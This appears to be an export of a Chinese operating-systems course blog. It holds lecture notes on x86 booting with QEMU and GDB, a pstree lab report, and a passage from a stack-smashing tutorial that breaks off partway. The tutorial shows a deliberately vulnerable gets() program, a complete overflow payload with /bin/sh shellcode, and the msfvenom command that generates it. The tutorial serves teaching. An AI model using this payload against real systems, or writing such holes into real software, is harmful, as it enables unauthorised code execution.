    <title>NJU-OS Lecture 09: State Machine of OS</title>
    <url>/2022/03/17/NJU-OS%20Lecture%2009%20-%20State%20Machine%20of%20OS/</url>
    <content><![CDATA[<h2 id="Bare-metal-amp-Software"><a href="#Bare-metal-amp-Software" class="headerlink" title="Bare-metal &amp; Software"></a>Bare-metal &amp; Software</h2><p>数字电路本身就是一个巨大的状态机。硬件厂商会保证 CPU reset 后处理器处在一个确定的状态，各个单元的固定的值会写在手册中。以 x86 为例，手册规定了 CPU reset 后 rip 的值会是 0xfff0，EFLAGS 的值为 0x2，当前硬件运行在 16-bit 模式中，不响应中断。</p>
<span id="more"></span>

<p>CPU 只是一个周而复始的取值译码执行的东西，因此它马上会做的事情就是取出 0xfff0 处的指令并执行。0xfff0 处通常是一个跳转指令，PC 会跳转到固件代码执行。固件 (Firmware) 是硬件厂商写死在一块 ROM 上的代码，常见的固件程序有 BIOS 和 UEFI 两种，后者更加现代机制更加复杂，这里简介 Legacy BIOS 的过程：</p>
<p>BIOS 的主要工作是扫描各个硬盘/U盘/软盘……然后将第一个可引导的设备的第一个扇区 (512B) 加载到地址 0x7c00 处。可引导的设备的第一个扇区会遵循主引导记录 (Master Boot Record, MBR) 的格式。如果我们使用命令</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cat executable-x86_64-qemu | head -c <span class="number">512</span> | xxd</span><br></pre></td></tr></table></figure>

<p>查看一个镜像文件的前 512 个字节，我们可以看到其末尾一定是 0x55aa。这是 MBR 的结束标志。</p>
<p>此时硬件仍然工作在 16-bit 模式上。规定 <code>CS:IP=0x7c00</code> ，即 <code>(R[CS]&lt;&lt;4) | R[IP] == 0x7c00</code> ，其他没有任何约束。Firmware 执行结束后，PC 跳转到 0x7c00 执行，刚刚加载过来的是 Legacy boot (boot loader)，它负责完成操作系统的加载：初始化栈和堆区，为 main() 传递参数等等。</p>
<h2 id="Code-Firmware"><a href="#Code-Firmware" class="headerlink" title="Code: Firmware"></a>Code: Firmware</h2><p>QEMU 是一个全系统模拟器，我们可以通过 GDB 远程连接的方式来调试 QEMU，从而观测各个时刻的系统状态。</p>
<p>一个启动 QEMU 并使用 GDB 监听的脚本如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -smp 1\</span><br><span class="line">  -S -s\</span><br><span class="line">  -drive format=raw,file=amgame-x86_64-qemu &amp;</span><br><span class="line">pid=$!</span><br><span class="line"></span><br><span class="line">gdb -x remote.gdb ; <span class="built_in">kill</span> -9 $!</span><br></pre></td></tr></table></figure>

<p><code>qemu-system-x86_64</code> 启动了一个 x86-64 架构的 QEMU 模拟器，之后的各个选项和参数的意义如下：</p>
<ul>
<li><code>-smp 1</code> 指定了 QEMU 模拟单核 CPU。</li>
<li><code>-S</code> 选项表示让 QEMU 停止在 CPU reset 后的第一条指令上。</li>
<li><code>-s</code> 选项是 <code>-gdb tcp::1234</code> 的简写，表示在端口 1234 打开一个 gdbserver。</li>
<li><code>-drive format=raw,file=amgame-x86_64-qemu</code> 告诉了 QEMU 用于引导的设备。这里笔者使用了 Lab0 中 amgame 的镜像。</li>
</ul>
<p>gdb 的 <code>-x</code> 选项后面可以跟一个脚本，表示在启动 gdb 之后自动运行后面的脚本。笔者在脚本中只做了一行配置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<p>表示连接到 gdbserver。之前我们给运行 QEMU 的进程分配了一个进程号，现在用 <code>kill -9 $!</code> 可以在退出 gdb 之后帮我们自动杀死 QEMU 的进程。</p>
<p>运行这个脚本，我们可以看到 QEMU 停在了 CPU reset 后的初始状态。使用 <code>i r</code> 命令打印寄存器信息，可以看到 <code>rip = 0xfff0</code>，<code>eflags = 0x2</code> 等，符合手册的约定。此时如果使用命令 <code>x/16xb 0x7c00</code> 查看地址 0x7c00 附近的内存内容，可以看到全部是 0 (注：<code>x</code> 是打印，<code>16</code> 是打印 16 个 byte，<code>x</code> 是按照十六进制打印，<code>b</code> 是将各个 byte 分开)。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7c00:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">0x7c08:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br></pre></td></tr></table></figure>

<p>想要监控 BIOS 的行为，我们可以用命令 <code>wa *0x7c00</code> 在这个地址上打一个断点，然后 continue，该地址的值出现变化时 GDB 会停下并通知我们。</p>
<p>当前系统仍处于 16 位模式，因此需要用 cs 和 rip 两个寄存器来定位指令的位置。使用 <code>x/i ($cs * 16 + $rip)</code> 查看当前指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xfa591:	rep insl (%dx),%es:(%edi)</span><br></pre></td></tr></table></figure>

<p>这是一条内存拷贝指令，刚开始可以看到 <code>%es:(%edi) == 0x7c00</code> ，随着 repeat 的推进，<code>(%edi)</code> 的值逐渐变大。如果再查看 0x7c00 附近的内容，可以看到 MBR 正在被逐渐搬入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7c00:	0xfa	0x31	0xc0	0x8e	0xd8	0x8e	0xc0	0x8e</span><br><span class="line">0x7c08:	0xd0	0xb8	0x01	0x4f	0xb9	0x12	0x01	0xbf</span><br><span class="line">0x7c10:	0x00	0x40	0xcd	0x10	0x00	0x00	0x00	0x00</span><br><span class="line">0x7c18:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br></pre></td></tr></table></figure>

<h2 id="State-Machine-of-OS"><a href="#State-Machine-of-OS" class="headerlink" title="State Machine of OS"></a>State Machine of OS</h2><p>Firmware 和 boot loader 共同完成了操作系统的加载。进入 C 代码后，操作系统将完全遵循 C 语言的形式语义（当然，调用 AbstractMachine API 的部分是对 C 语言形式语义的补充）。</p>
<p>AbstractMachine 对 C 程序语义的扩展主要是以下几个部分：</p>
<ul>
<li>TRM + MPE<ul>
<li>完全等同于多线程。将整个系统的状态机从一条链变成多条链，之后的执行将是 non-deterministic 的。</li>
<li>IOE API 相当于库函数。</li>
</ul>
</li>
<li>CTE<ul>
<li>允许创建多个执行流。</li>
<li>yield() 会主动切换，中断会被动切换。</li>
</ul>
</li>
<li>VME<ul>
<li>创建一个“经过地址翻译的执行模式”。</li>
</ul>
</li>
</ul>
<p>整个系统的状态机大致可以看成如下过程：</p>
<pre class="mermaid">flowchart LR
    subgraph CPUReset
        PC=0xfff0 --- EFLAGS=0x2 --- CR0=... --- S0[...]
    end
    id0((init))-. CPU Reset .-> CPUReset
    CPUReset -. Firmware .-> Boot
    subgraph Boot
        PC=0x7c00 --- MBR[MBR at 0x7c00] --- ...
    end
    Boot -. OS booter .-> main
    subgraph main
        g[global] -.- sf[stack frame] -.- PC -.- S[...]
    end
    main -. mpe_init .-> multithread
    subgraph multithread
        gg[global]
        sf1[stack frame] --- pc1[PC] --- o1[...]
        sf2[stack frame] --- pc2[PC] --- o2[...]
    end
    multithread -. CPU1 .-> state1((...))
    multithread -. CPU2 .-> state2((...))
    multithread -. Interrupt .-> state3((...))</pre>

<h2 id="Code-AbstractMachine"><a href="#Code-AbstractMachine" class="headerlink" title="Code: AbstractMachine"></a>Code: AbstractMachine</h2><blockquote>
<p><strong>Unix Philosophy</strong></p>
<p>Makefile 中的变量的定义可能散落在世界各处，因此静态地读 Makefile 效果可能不好。好的方式是直接观测 Makefile 做了怎样的事情。这里提供一套命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make mainargs=HelloOS run -nB \</span><br><span class="line">| grep -ve <span class="string">&#x27;^\(\#\|echo\|mkdir\|make\)&#x27;</span> \</span><br><span class="line">| sed <span class="string">&quot;s#<span class="variable">$AM_HOME</span>#\$AM_HOME#g&quot;</span> \</span><br><span class="line">| sed <span class="string">&quot;s#<span class="variable">$PWD</span>#.#g&quot;</span> \</span><br><span class="line">| vim -</span><br></pre></td></tr></table></figure>

<ul>
<li>make 的 <code>-n</code> 选项可以只输出执行的命令而不真正执行，<code>-B</code> 选项可以忽略已经编译好的内容从头编译。</li>
<li>grep 用于筛选，<code>-v</code> 选项表示反向筛选，<code>-e</code> 表示使用正则表达式匹配。</li>
<li>sed 可以作替换，这里将冗长的路径名替换成了短的。</li>
<li>vim - 命令可以将输出导入到 vim 中查看。</li>
</ul>
<p>在 vim 中使用 <code>:%s/ /\r  /g</code> 可以将空格改为换行，从而提高可读性。</p>
</blockquote>
<p>通过观察 Makefile 的输出结果，我们可以看到它是如何创建镜像文件以及传输命令行参数的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">( cat <span class="variable">$AM_HOME</span>/am/src/x86/qemu/boot/bootblock.o;</span><br><span class="line">  head -c 1024 /dev/zero; </span><br><span class="line">  cat ./build/threados-x86_64-qemu.elf )</span><br><span class="line">&gt; ./build/threados-x86_64-qemu</span><br></pre></td></tr></table></figure>

<p><code>bootblock.o</code> 是主引导记录。<code>head -c 1024 /dev/zero</code> 取出了 1024B 的 \0。<code>threados-x86_64-qemu.elf</code> 是我们之前编译、链接得到的 elf 文件。将这三者拼接起来输出到文件 <code>threados-x86_64-qemu</code> 中，就制作好了镜像文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">( <span class="built_in">echo</span> -n HelloOS; ) | dd <span class="keyword">if</span>=/dev/stdin of=./build/threados-x86_64-qemu </span><br><span class="line"> bs=512 count=2 seek=1 conv=notrunc status=none</span><br></pre></td></tr></table></figure>

<p>参数 HelloOS 被输出后，dd 指定 input file 为 stdin，output file 为我们刚刚制作的镜像，将参数写到了第二个扇区里 (即 MBR 后面紧跟着的扇区)。</p>
<p>之前我们用 GDB 调试了固件将 MBR 加载到 0x7c00 的过程，现在我们可以继续用 GDB 调试 OS booter 的运行过程。</p>
<blockquote>
<p><strong>没有 OS booter 的符号表怎么办？</strong></p>
<p>仔细阅读 AbstractMachine 的 Makefile，我们发现 <code>bootblock.o</code> 就是主引导记录，它的生成过程如下：</p>
<ul>
<li><p><code>gcc -static -m32 -fno-pic -g -Os -nostdlib -Ttext 0x7c00 -I$AM_HOME/am/src -o bootblock.o start.S main.c</code>，该命令编译 <code>am/src/x86/qemu/boot/</code> 目录下的 <code>main.c</code> 和 <code>start.S</code> 并链接成一个 <code>bootblock.o</code>。</p>
<p>  为了生成带有调试信息的二进制文件，我们应当加入 <code>-g</code> 选项。</p>
</li>
<li><p><code>python genboot.py bootblock.o</code> 对 <code>bootblock.o</code> 做了进一步的修改，阅读 <code>genboot.py</code> ：</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, pathlib, subprocess</span><br><span class="line">    </span><br><span class="line">f = pathlib.Path(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    objcopy = os.getenv(<span class="string">&#x27;CROSS_COMPILE&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&#x27;objcopy&#x27;</span></span><br><span class="line">    data = subprocess.run(</span><br><span class="line">        [objcopy, <span class="string">&#x27;-S&#x27;</span>, <span class="string">&#x27;-O&#x27;</span>, <span class="string">&#x27;binary&#x27;</span>, <span class="string">&#x27;-j&#x27;</span>, <span class="string">&#x27;.text&#x27;</span>, f, <span class="string">&#x27;/dev/stdout&#x27;</span>],</span><br><span class="line">        capture_output=<span class="literal">True</span>).stdout</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(data) &lt;= <span class="number">510</span></span><br><span class="line">    data += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">510</span> - <span class="built_in">len</span>(data)) + <span class="string">b&#x27;\x55\xaa&#x27;</span></span><br><span class="line">    f.write_bytes(data)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    f.unlink()</span><br><span class="line">    <span class="keyword">raise</span></span><br></pre></td></tr></table></figure>

<p>  它的主要工作是用 objcopy 工具将 <code>bootblock.o</code> 中的关键内容拷贝出来，<code>-S</code> 选项表示丢弃重定位信息，符号信息，调试信息等不需要的内容；<code>-j .text</code> 表示只保留代码节。拷贝出来后在字节流的后面补上若干 0，最后加上 0x55aa，以形成一个 MBR。</p>
</li>
</ul>
<p>为了获得符号表，笔者做了如下修改：将第一步生成的 <code>bootblock.o</code> 备份一份重命名为 <code> boot-sym.o</code> 用于加载符号表，并在 gdb 启动时的自动化脚本中添加：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">symbol-file /path/to/boot-sym.o</span><br></pre></td></tr></table></figure>
</blockquote>
<p>在 GDB 中打断点 <code>wa ($rip != 0x7c00)</code> (或者 <code>b _start</code>) 即可定位到 OS booter。此时机器仍然处于 16 位模式，GDB 不支持 16 位的调试，打印出来的汇编命令会出现错误。我们可以在 <code>$AM_HOME/am/src/x86/qemu/boot/start.S</code> 中找到对应的指令。可以看到在执行了不多的几条指令后，PC 跳转到了函数 start32。start32 执行了几条简单的指令后跳转到了 load_kernel()。(在 load_kernel() 中终于可以用 layout src 调试了)</p>
<p>load_kernel() 和 nanos-lite 中的 loader() 功能类似：将 elf 文件中的各个段拷贝到内存的指定地址 0x8000，并跳转到入口函数启动内核。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Elf32_Ehdr *elf32 = (<span class="keyword">void</span> *)<span class="number">0x8000</span>;</span><br><span class="line">Elf64_Ehdr *elf64 = (<span class="keyword">void</span> *)<span class="number">0x8000</span>;</span><br><span class="line"><span class="keyword">int</span> is_ap = boot_record()-&gt;is_ap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_ap) &#123;</span><br><span class="line">    <span class="comment">// load argument (string) to memory</span></span><br><span class="line">    copy_from_disk((<span class="keyword">void</span> *)MAINARG_ADDR, <span class="number">1024</span>, <span class="number">-1024</span>);</span><br><span class="line">    <span class="comment">// load elf header to memory</span></span><br><span class="line">    copy_from_disk(elf32, <span class="number">4096</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (elf32-&gt;e_machine == EM_X86_64) &#123;</span><br><span class="line">      load_elf64(elf64);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      load_elf32(elf32);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码调用 copy_from_disk() 将 mainargs 以及 elf 文件从 disk 中拷贝出来，再调用 load_elf() 将其加载到 0x8000 位置。在执行 if 之前通过 <code>p *elf64</code> 查看 0x8000 附近的内容，可以看到各个字段全部为空。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) p *elf64</span><br><span class="line"><span class="variable">$1</span> = &#123;e_ident = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 15 <span class="built_in">times</span>&gt;, e_type = 0, e_machine = 0,</span><br><span class="line">  e_version = 0, e_entry = 0, e_phoff = 0, e_shoff = 0, e_flags = 0,</span><br><span class="line">  e_ehsize = 0, e_phentsize = 0, e_phnum = 0, e_shentsize = 0, e_shnum = 0,</span><br><span class="line">  e_shstrndx = 0&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">load_program</span><span class="params">(<span class="keyword">uint32_t</span> filesz, <span class="keyword">uint32_t</span> memsz, <span class="keyword">uint32_t</span> paddr, <span class="keyword">uint32_t</span> offset)</span> </span>&#123;</span><br><span class="line">  copy_from_disk((<span class="keyword">void</span> *)paddr, filesz, offset);</span><br><span class="line">  <span class="keyword">char</span> *bss = (<span class="keyword">void</span> *)(paddr + filesz);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = filesz; i != memsz; i++) &#123;</span><br><span class="line">    *bss++ = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">load_elf64</span><span class="params">(Elf64_Ehdr *elf)</span> </span>&#123;</span><br><span class="line">  Elf64_Phdr *ph = (Elf64_Phdr *)((<span class="keyword">char</span> *)elf + elf-&gt;e_phoff);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; elf-&gt;e_phnum; i++, ph++) &#123;</span><br><span class="line">    load_program(</span><br><span class="line">      (<span class="keyword">uint32_t</span>)ph-&gt;p_filesz,</span><br><span class="line">      (<span class="keyword">uint32_t</span>)ph-&gt;p_memsz,</span><br><span class="line">      (<span class="keyword">uint32_t</span>)ph-&gt;p_paddr,</span><br><span class="line">      (<span class="keyword">uint32_t</span>)ph-&gt;p_offset</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>load_elf() 根据 elf 文件的 program header 调用 load_program() 将各个段加载到内存中。load_program() 中的一个小细节是：filesz 和 memsz 的差值是 elf 为 .bss 节预留的空位，根据 C 程序的约定，操作系统有义务将其填充为 0。</p>
<p>执行完 load_elf() 后，再查看 0x8000 附近的内存，可以看到已经被填上了内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) p *elf64</span><br><span class="line"><span class="variable">$1</span> = &#123;e_ident = <span class="string">&quot;\177ELF\002\001\001\000\000\000\000\000\000\000\000&quot;</span>,</span><br><span class="line">  e_type = 2, e_machine = 62, e_version = 1, e_entry = 1049360, e_phoff = 64,</span><br><span class="line">  e_shoff = 152256, e_flags = 0, e_ehsize = 64, e_phentsize = 56, e_phnum = 2,</span><br><span class="line">  e_shentsize = 64, e_shnum = 17, e_shstrndx = 16&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (elf32-&gt;e_machine == EM_X86_64) &#123;</span><br><span class="line">  ((<span class="keyword">void</span>(*)())(<span class="keyword">uint32_t</span>)elf64-&gt;e_entry)();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  ((<span class="keyword">void</span>(*)())(<span class="keyword">uint32_t</span>)elf32-&gt;e_entry)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后这两行，根据架构跳转到 elf 文件中 e_entry 所保存的入口函数地址。这里使用了 C 语言的技巧，将一个地址强制转换成一个函数指针并调用从而实现跳转。</p>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS MiniLab 1: pstree</title>
    <url>/2022/03/11/NJU-OS%20Minilab%2001%20-%20pstree/</url>
    <content><![CDATA[<p>该实验主要目的是实现一个精简版的 Linux pstree 命令行工具，以较为优美的方式打印当前系统中的进程树。</p>
<span id="more"></span>

<h2 id="Parse-args"><a href="#Parse-args" class="headerlink" title="Parse args"></a>Parse args</h2><p>首先对输入的选项列表进行分析。笔者使用了 C 库函数 getopt_long()，它不仅可以帮助我们快速解析选项，还可以同时识别一个选项的长短版本 (使用 C 库提供的 option 结构体可以定义每种选项的长短版本以及是否需要参数等)，识别多个选吸纳更合并给出的格式 etc.。</p>
<p>定义好表格后，仅需一句话即可完成选项解析：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">option</span> <span class="title">table</span>[] =</span> &#123;</span><br><span class="line">    &#123;<span class="string">&quot;numeric-sort&quot;</span>, no_argument, <span class="literal">NULL</span>, <span class="string">&#x27;n&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;show-pids&quot;</span>   , no_argument, <span class="literal">NULL</span>, <span class="string">&#x27;p&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;version&quot;</span>     , no_argument, <span class="literal">NULL</span>, <span class="string">&#x27;V&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0</span>             , <span class="number">0</span>          , <span class="literal">NULL</span>,  <span class="number">0</span> &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">getopt_long(argc, argv, <span class="string">&quot;-npV&quot;</span>, table, <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>关于版本信息</strong></p>
<p>Linux 的 pstree 工具会将版本信息输出到标准错误流，为了模拟这一特性，我们可以使用 fprintf 语句将版本信息输出到 stderr 文件。</p>
</blockquote>
<h2 id="Fetch-Process-Information"><a href="#Fetch-Process-Information" class="headerlink" title="Fetch Process Information"></a>Fetch Process Information</h2><p>Linux 提供 procfs，我们可以用读写文件的 API 来获取操作系统中的进程状态。procfs 的根目录是 <code>/proc</code>，该目录中所有是数字的文件夹都存储了一个进程相关的信息，文件夹的数字名就是进程编号。配合使用 C 库函数 opendir() 和 readdir() 就可以遍历 <code>/proc</code> 下的所有内容并筛选出那些是数字的文件夹名。</p>
<p>每个进程文件夹下的 <code>/proc/[pid]/stat</code> 文件中存储了我们打印进程树所需要的状态信息，包括但不限于进程的名字，进程的状态，进程号，父进程号等。我们可以利用这些信息把进程树构建出来。</p>
<blockquote>
<p><strong>关于进程名的格式</strong></p>
<p>根据 <code>man proc</code> 的提示，所有的进程名都是用一对小括号包裹着的。笔者起初使用了 <code>scanf(&quot;%[^)]&quot;)</code> 的方法，读到右括号停止，但发现进程中有一些进程的进程名本身就带括号。因此只能一个字节一个字节读并同步维护一个括号的栈来确定什么时候停止。</p>
</blockquote>
<p>我们可以在 <code>/proc/sys/kernel/pid_max</code> 文件中查看进程号的最大值，在 64 位系统中，这个最大值为 $2^{22}$。为了代码编写的方便和效率，笔者开了一个这么大的数组 proc_pos[] 用于维护每个进程号对应到进程信息结构体数组 proc[] 的哪个位置。 proc 结构体中维护了一个当前进程的所有孩子的链表，孩子数量，进程名等信息。由于系统中真正在运行的进程个数远小于 $2^{22}$，这个做法可以省很多内存。</p>
<p>事实上，Linux 的 pstree 工具还会将一个进程下的所有线程打印出来。我们可以在 <code>/proc/[pid]/task</code> 下看到所有的线程文件夹，<code>/proc/[pid]/task/[tid]/stat</code> 中也有各个线程的状态，不过本实验不要求打印线程。</p>
<h2 id="Print-tree"><a href="#Print-tree" class="headerlink" title="Print tree"></a>Print tree</h2><p>打印进程树可以用对进程树的一次 dfs 来实现 —— 根节点是 1 号进程 systemd。这里需要注意的是遍历顺序的问题：在默认情况下，pstree 各个子树会按照进程名的字典序排序，如果有 <code>-n</code> 选项，则要按照进程号从小到大排序。在笔者的实现中，单向链表不方便进行高级的排序，但我们可以直接交换两个链表内部的内容，使用朴素的冒泡排序来完成工作。</p>
<blockquote>
<p><strong>更优美的显示</strong></p>
<p>打印树结构的最简单的方法是使用缩进：我们只需要记录当前递归到第几层，并打印相应个数的 TAB 即可。为了实现像 Linux pstree 工具那样精美的树结构，我们需要以下观察：</p>
<ul>
<li>每个进程的第一个子进程不换行。仔细思考以下，我们会发现这个规则等价于我们只会在那些叶子进程处换行。</li>
<li>每个进程名之前有一个树的节点符号，这个节点符号遵循的规则如下：<ul>
<li>如果某进程有且仅有一个子进程，则节点符号为 <code>-</code>；</li>
<li>如果某进程有大于一个子进程，则第一个孩子的节点符号是 <code>+</code>，最后一个孩子的节点符号是 <code>&#96;</code> ，中间孩子的节点符号是 <code>|</code>。</li>
</ul>
</li>
<li>当我们在打印内层进程内容时，外层进程树会有 <code>|</code> 延伸下来，我们可以用一个栈记录所有需要打印 <code>|</code> 的位置。但需要注意的是：每个进程的最后一个子进程如果还有子进程，子进程的子进程是不会被子进程的父进程的 <code>|</code> 包裹住的，具体操作上，每个进程的最后一个子进程负责将父进程从栈中弹出。</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lab Reports</category>
      </categories>
  </entry>
  <entry>
    <title>Stack-smashing Attack: An Introduction</title>
    <url>/2022/02/28/Stack-smashing%20Attack%20-%20An%20Introduction/</url>
    <content><![CDATA[<p>本文主要介绍一段简单的栈溢出攻击代码，并简介几种 Linux 中防止栈溢出攻击的方法。</p>
<h2 id="Hack-Code"><a href="#Hack-Code" class="headerlink" title="Hack Code"></a>Hack Code</h2><blockquote>
<p>注：为了实现的简单，受攻击的 C 程序编译时应加上如下参数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -o vuln vuln.c -fno-<span class="built_in">stack</span>-protector -z execstack</span><br></pre></td></tr></table></figure>

<p>这两个参数使得栈上数据可执行并取消了栈溢出检查。此外，我们还需要手动关闭 ASLR。</p>
</blockquote>
<span id="more"></span>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> msg[<span class="number">32</span>];</span><br><span class="line">	gets(msg);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>gets(msg)</code> 函数是一个非常危险的字符串读取函数，因为它完全无法控制会读取到几个字符，一旦读取的字符串长度超过 msg 的长度就会发生缓冲区溢出。最新版的 C 标准已经将 gets() 函数移除，fgets() 指定输入文件为 stdin 可以达到和 gets 相同的效果，不同的是 fgets() 可以指定输入长度的上限。下面介绍的 hack 代码正是利用了 gets() 不检查溢出的特性。</p>
<p>使用 GDB 进行调试，通过命令 <code>i r rsp</code> 和 <code>i r rbp</code> 确定栈帧的位置，通过 <code>x/32x $rsp</code> 检查栈帧附近的内容，并确定 buf[] 的首地址为 0x7fffffffdd60。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsp = 0x7fffffffdd50 rbp = 0x7fffffffdd80 buf = 0x7fffffffdd60</span><br><span class="line"></span><br><span class="line">0x7fffffffdd50:	0xffffde78	0x00007fff	0x555551a0	0x00000001</span><br><span class="line">0x7fffffffdd60:	0x00000000	0x00000000	0x55555080	0x00005555</span><br><span class="line">0x7fffffffdd70:	0xffffde70	0x00007fff	0x00000000	0x00000000</span><br><span class="line">0x7fffffffdd80:	0x00000000	0x00000000	0xf7de9565	0x00007fff</span><br><span class="line">0x7fffffffdd90:	0xffffde78	0x00007fff	0xf7fc7000	0x00000001</span><br><span class="line">0x7fffffffdda0:	0x55555169	0x00005555	0xffffe209	0x00007fff</span><br><span class="line">0x7fffffffddb0:	0x555551a0	0x00005555	0xace3e1b6	0x2c1321da</span><br><span class="line">0x7fffffffddc0:	0x55555080	0x00005555	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>

<p>根据调用规约，在 64 位机器上，<code>rbp + 8</code> 处存放的是返回地址 0x7ffff7de9565。我们攻击的核心目标是利用 gets() 的缓冲区溢出改写返回地址，使得 main() 函数返回时可以跳转到我们的“恶意程序”上继续执行。</p>
<p>我们的 hack code 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41</span><br><span class="line">\x90\xdd\xff\xff\xff\x7f\x00\x00</span><br><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line">\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52</span><br><span class="line">\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00\x00\x2f\x62\x69</span><br><span class="line">\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05</span><br></pre></td></tr></table></figure>

<ul>
<li><p>第一部分是 40 个字符 A，它的目的是填充整个栈帧，一直填到返回地址之前。</p>
</li>
<li><p>第二部分是我们希望的返回地址，这个数值是 0x7fffffffdd90 (返回地址所在地址的下一位)。由于我们提前关闭了 ASLR，所以栈帧的地址和返回地址都是不变的，我们可以直接将这个数值硬编码在 hack code 里。</p>
</li>
<li><p>第三部分是一串空字符，称为 NOP sled。在本程序中是不必要的 (因为没有 ASLR)，在打开 ASLR 的情况下，一段 NOP sled 可以提高攻击成功的概率，因为我们只要让返回地址落在 NOP sled 的范围内，CPU 便会执行 nop 指令，PC 不断后移，直到来到我们的恶意代码。</p>
</li>
<li><p>第四部分是我们的恶意程序，我们希望打开一个新的程序 <code>/bin/sh</code>。这里笔者使用了工具 msfvenom：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/<span class="built_in">exec</span> CMD=/bin/sh -f c</span><br></pre></td></tr></table></figure>

<p>  它可以自动生成一段打开 <code>/bin/sh</code> 的机器指令，并以 C 风格输出：</p>
